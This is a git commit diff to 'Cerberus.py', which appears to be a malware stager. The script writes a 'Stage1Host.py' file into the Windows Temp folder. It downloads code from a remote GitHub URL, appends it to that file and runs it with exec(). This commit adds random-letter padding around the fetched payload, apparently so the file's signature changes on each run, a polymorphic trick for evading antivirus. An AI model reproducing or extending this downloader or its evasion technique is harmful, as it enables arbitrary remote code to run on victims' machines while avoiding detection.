261a4767644bec404e7d75b1610578aec8395b64
Param Kudle <136839842+paramkudle@users.noreply.github.com>
2024-07-11 15:08:37 +0530

    Update Cerberus.py

--- Cerberus.py
+++ Cerberus.py
@@ -1,16 +1,35 @@
+import random
+import string
 import os.path
 import urllib.request
-from bs4 import BeautifulSoup
+
+length = random.randrange(100,1000)
+poly = True
 
 path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1Host.py")
 
+def noise(length):
+    rNoise = ""
+    for i in range (0, length+1):
+        rNoise = (str(rNoise) + str(random.choice(string.ascii_letters)))
+    return rNoise
+
+rN = noise(length)
+
 if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
     file = open('Stage1Host.py', 'a')
-    file.close()
+    if poly==True:
+        file.write(rN + "\n")
+        file.close()
+    else:
+        file.close()
 
 
 # Retrieves code from URL and appends it into Stage1 created earlier 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt", path)  
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt") as retrieve:
+    data = retrieve.read().decode("utf-8")
+    with open(path, "a+") as file:
+        file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)
 
 # Runs the Stage1 file
-exec(open(path).read())  
+exec(open(path).read())
